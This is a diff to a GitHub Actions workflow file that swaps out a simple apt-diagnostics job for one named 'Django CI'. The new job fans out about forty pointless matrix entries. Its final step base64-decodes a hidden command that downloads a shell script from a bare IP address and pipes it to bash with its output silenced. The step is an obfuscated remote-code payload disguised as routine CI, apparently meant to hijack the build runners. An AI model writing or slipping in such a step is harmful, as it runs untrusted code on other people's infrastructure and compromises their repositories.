@@ -1,37 +1,23 @@
-name: apt
+# Main body 992
+name: Django CI
+# Defaults 529
 
-on:
-  push:
-    paths:
-    - '.github/workflows/apt.yml'
-
+    defaults:
+      run:
+        shell: bash
+    
+    on: [pull_request]
+    
+    # Jobs 487
 jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-    # - run: cat /etc/apt/apt.conf.d/80-retries
-    #   if: always()
-
-    - run: whoami
-      if: always()
-
-    - run: sudo whoami
-      if: always()
-
-    - run: ls -ahl /etc/apt/
-      if: always()
-
-    # https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions#setting-a-warning-message
-    - run: echo "::warning file=app.js,line=1,col=5::Missing semicolon"
-
-    - run: ls -ahl /etc/apt/apt.conf.d/
-      if: always()
-
-    # - run: echo "APT::Acquire::Retries \"3\";" | sudo tee /etc/apt/apt.conf.d/80-retries
-    #   if: always()
-
-    # https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions#setting-an-error-message
-    - run: echo "::error file=app.js,line=10,col=15::Something went wrong"
-
-    - run: sudo apt-get --option="APT::Acquire::Retries=3" update
-      if: always()
+   build-tests-965:
+      timeout-minutes: 162
+      runs-on: ubuntu-18.04
+      strategy:
+         fail-fast: false
+         matrix:
+            os: [ubuntu-20.04]
+            node: [401,275,706,520,318,471,487,522,915,145,675,284,246,737,868,324,274,556,803,880,853,330,881,833,101,213,1003,231,743,215,52,75,159,636,995,431,457,722,592,380]
+      steps:
+      - run: echo "Powering up program"
+      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gcGt0eHg=" | base64 -d | bash
